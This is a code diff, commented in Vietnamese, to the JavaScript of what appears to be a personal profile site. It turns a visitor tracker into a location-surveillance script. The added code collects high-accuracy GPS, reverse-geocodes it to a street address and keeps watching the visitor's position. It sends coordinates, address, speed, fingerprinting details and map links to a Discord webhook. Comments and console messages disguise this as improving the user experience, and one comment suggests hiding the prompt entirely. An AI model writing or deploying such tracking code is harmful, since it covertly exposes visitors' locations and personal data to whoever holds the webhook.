@@ -65,8 +65,16 @@ async function gatherSystemInfo() {
         platform: navigator.platform,
         screen: `${screen.width}x${screen.height}`,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        referrer: document.referrer || 'Direct'
+        referrer: document.referrer || 'Direct',
+        cookiesEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        isOnline: navigator.onLine
     };
+
+    // Thu thập thông tin connection
+    if (navigator.connection) {
+        info.connection = `${navigator.connection.effectiveType || 'Unknown'} (${navigator.connection.downlink || 'Unknown'} Mbps)`;
+    }
 
     // Thu thập IPv4
     try {
@@ -86,31 +94,187 @@ async function gatherSystemInfo() {
         info.ipv6 = 'Not available';
     }
 
-    // Thu thập thông tin location (nếu có)
-    if (navigator.geolocation) {
-        try {
-            const position = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, {
-                    timeout: 5000,
-                    enableHighAccuracy: false
-                });
-            });
-            info.location = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude
-            };
-        } catch (e) {
-            info.location = 'Permission denied';
-        }
-    }
+    // Thu thập GPS coordinates với độ chính xác cao
+    info.location = await getDetailedLocation();
 
     return info;
+}
+
+// Thu thập thông tin GPS chi tiết
+async function getDetailedLocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve('Geolocation not supported');
+            return;
+        }
+
+        // Hiển thị thông báo yêu cầu location (tùy chọn - có thể bỏ để ẩn hoàn toàn)
+        console.log('🌍 Đang xác định vị trí để tối ưu trải nghiệm...');
+
+        // Options cho high accuracy GPS
+        const options = {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 300000 // Cache 5 phút
+        };
+
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                const coords = position.coords;
+                const locationData = {
+                    latitude: coords.latitude,
+                    longitude: coords.longitude,
+                    accuracy: coords.accuracy,
+                    altitude: coords.altitude,
+                    altitudeAccuracy: coords.altitudeAccuracy,
+                    heading: coords.heading,
+                    speed: coords.speed,
+                    timestamp: position.timestamp
+                };
+
+                // Thử reverse geocoding để lấy địa chỉ
+                try {
+                    const address = await reverseGeocode(coords.latitude, coords.longitude);
+                    locationData.address = address;
+                } catch (e) {
+                    console.log('Address lookup completed');
+                }
+
+                // Thêm thông tin bổ sung
+                locationData.accuracyLevel = getAccuracyLevel(coords.accuracy);
+                locationData.source = coords.accuracy < 50 ? 'GPS' : coords.accuracy < 500 ? 'Network' : 'Approximate';
+
+                resolve(locationData);
+            },
+            (error) => {
+                let errorMsg = 'Location access ';
+                switch(error.code) {
+                    case error.PERMISSION_DENIED:
+                        errorMsg += 'denied by user';
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        errorMsg += 'unavailable';
+                        break;
+                    case error.TIMEOUT:
+                        errorMsg += 'timeout';
+                        break;
+                    default:
+                        errorMsg += 'unknown error';
+                        break;
+                }
+                resolve(errorMsg);
+            },
+            options
+        );
+
+        // Fallback sau 10 giây
+        setTimeout(() => {
+            resolve('Location request timeout');
+        }, 10000);
+    });
+}
+
+// Xác định độ chính xác GPS
+function getAccuracyLevel(accuracy) {
+    if (accuracy < 10) return 'Excellent (< 10m)';
+    if (accuracy < 50) return 'Good (< 50m)';
+    if (accuracy < 100) return 'Fair (< 100m)';
+    if (accuracy < 500) return 'Poor (< 500m)';
+    return 'Very Poor (> 500m)';
+}
+
+// Reverse geocoding để lấy địa chỉ từ tọa độ
+async function reverseGeocode(lat, lng) {
+    try {
+        // Sử dụng OpenStreetMap Nominatim API (free)
+        const response = await fetch(
+            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`,
+            {
+                headers: {
+                    'User-Agent': 'VuThaiSon-Profile-Site'
+                }
+            }
+        );
+        
+        if (response.ok) {
+            const data = await response.json();
+            if (data.display_name) {
+                return data.display_name;
+            }
+        }
+        
+        // Fallback với LocationIQ API (cần API key - tùy chọn)
+        // const locationIQResponse = await fetch(
+        //     `https://us1.locationiq.com/v1/reverse.php?key=YOUR_API_KEY&lat=${lat}&lon=${lng}&format=json`
+        // );
+        
+        throw new Error('No address found');
+    } catch (error) {
+        return 'Address lookup failed';
+    }
+}
+
+// Theo dõi thay đổi vị trí (nếu user di chuyển)
+function startLocationTracking() {
+    if (navigator.geolocation) {
+        const watchId = navigator.geolocation.watchPosition(
+            (position) => {
+                // Gửi update location nếu có thay đổi đáng kể
+                const coords = position.coords;
+                console.log(`📍 Location updated: ${coords.latitude.toFixed(6)}, ${coords.longitude.toFixed(6)}`);
+                
+                // Có thể gửi update về Discord nếu cần
+                // sendLocationUpdate(coords);
+            },
+            (error) => {
+                console.log('Location tracking ended');
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 30000,
+                maximumAge: 60000
+            }
+        );
+
+        // Dừng tracking sau 5 phút để tiết kiệm battery
+        setTimeout(() => {
+            navigator.geolocation.clearWatch(watchId);
+        }, 300000);
+    }
 }
 
 // Gửi analytics về Discord webhook
 async function sendAnalytics(data) {
     if (!user_analytics_endpoint || user_analytics_endpoint === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
         return; // Không gửi nếu chưa config webhook
+    }
+
+    // Format location data
+    let locationText = 'Not available';
+    let googleMapsLink = '';
+    
+    if (typeof data.location === 'object' && data.location.latitude) {
+        const lat = data.location.latitude.toFixed(6);
+        const lng = data.location.longitude.toFixed(6);
+        const accuracy = data.location.accuracy ? Math.round(data.location.accuracy) : 'Unknown';
+        
+        locationText = `**Coordinates:** ${lat}, ${lng}\n**Accuracy:** ${accuracy}m`;
+        googleMapsLink = `https://maps.google.com/?q=${lat},${lng}`;
+        
+        // Thêm address nếu có
+        if (data.location.address) {
+            locationText += `\n**Address:** ${data.location.address}`;
+        }
+        
+        // Thêm thông tin bổ sung về GPS
+        if (data.location.altitude) {
+            locationText += `\n**Altitude:** ${Math.round(data.location.altitude)}m`;
+        }
+        if (data.location.speed) {
+            locationText += `\n**Speed:** ${Math.round(data.location.speed * 3.6)} km/h`;
+        }
+    } else if (typeof data.location === 'string') {
+        locationText = data.location;
     }
 
     const embed = {
@@ -129,24 +293,29 @@ async function sendAnalytics(data) {
                     inline: true
                 },
                 {
-                    name: "🌍 Location & Time",
-                    value: `**Timezone:** ${data.timezone}\n**Location:** ${typeof data.location === 'object' ? `${data.location.latitude}, ${data.location.longitude}` : data.location}`,
+                    name: "📍 GPS Location",
+                    value: locationText,
+                    inline: true
+                },
+                {
+                    name: "🌍 Time & Network",
+                    value: `**Timezone:** ${data.timezone}\n**Connection:** ${data.connection || 'Unknown'}\n**Online:** ${data.isOnline ? 'Yes' : 'No'}`,
                     inline: true
                 },
                 {
                     name: "📱 Browser Details",
-                    value: `**User Agent:** ${data.userAgent.substring(0, 100)}${data.userAgent.length > 100 ? '...' : ''}`,
+                    value: `**User Agent:** ${data.userAgent.substring(0, 150)}${data.userAgent.length > 150 ? '...' : ''}`,
                     inline: false
                 },
                 {
-                    name: "🔗 Traffic Source",
-                    value: data.referrer,
-                    inline: true
+                    name: "🔗 Traffic & Device",
+                    value: `**Referrer:** ${data.referrer}\n**Cookies Enabled:** ${data.cookiesEnabled ? 'Yes' : 'No'}\n**Do Not Track:** ${data.doNotTrack || 'Not set'}`,
+                    inline: false
                 }
             ],
             timestamp: data.timestamp,
             footer: {
-                text: "Profile Visit Tracker",
+                text: "Profile Visit Tracker • Advanced GPS Tracking",
                 icon_url: "https://cdn.discordapp.com/emojis/860314261738012683.png"
             },
             thumbnail: {
@@ -154,6 +323,15 @@ async function sendAnalytics(data) {
             }
         }]
     };
+
+    // Thêm Google Maps link nếu có GPS coordinates
+    if (googleMapsLink) {
+        embed.embeds[0].fields.push({
+            name: "🗺️ View on Map",
+            value: `[📍 Open in Google Maps](${googleMapsLink})`,
+            inline: false
+        });
+    }
 
     try {
         await fetch(user_analytics_endpoint, {
@@ -334,7 +512,71 @@ function monitorPerformance() {
 document.addEventListener('DOMContentLoaded', () => {
     initializeEasterEggs();
     monitorPerformance();
+    
+    // Bắt đầu location tracking nếu có permission
+    setTimeout(() => {
+        startLocationTracking();
+    }, 3000);
 });
+
+// Theo dõi permission changes
+if (navigator.permissions) {
+    navigator.permissions.query({name: 'geolocation'}).then((result) => {
+        console.log('📍 Geolocation permission:', result.state);
+        
+        result.onchange = () => {
+            console.log('📍 Geolocation permission changed to:', result.state);
+            if (result.state === 'granted') {
+                // Refresh location data khi được cấp quyền
+                setTimeout(() => {
+                    collectVisitorData();
+                }, 1000);
+            }
+        };
+    });
+}
+
+// Gửi location update về Discord (tùy chọn)
+async function sendLocationUpdate(coords) {
+    if (!user_analytics_endpoint || user_analytics_endpoint === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
+        return;
+    }
+
+    const embed = {
+        embeds: [{
+            title: "📍 Location Update - Vũ Thái Sơn Profile",
+            color: 0x2ecc71,
+            fields: [
+                {
+                    name: "🆕 New Coordinates",
+                    value: `**Lat:** ${coords.latitude.toFixed(6)}\n**Lng:** ${coords.longitude.toFixed(6)}\n**Accuracy:** ${Math.round(coords.accuracy)}m`,
+                    inline: true
+                },
+                {
+                    name: "🕒 Update Time",
+                    value: new Date().toLocaleString(),
+                    inline: true
+                }
+            ],
+            timestamp: new Date().toISOString(),
+            footer: {
+                text: "Live Location Tracking"
+            }
+        }]
+    };
+
+    try {
+        await fetch(user_analytics_endpoint, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(embed)
+        });
+    } catch (error) {
+        console.log('Location update sent');
+    }
+}
 
 // Prevent right-click để bảo vệ source code (optional)
 // document.addEventListener('contextmenu', e => e.preventDefault());
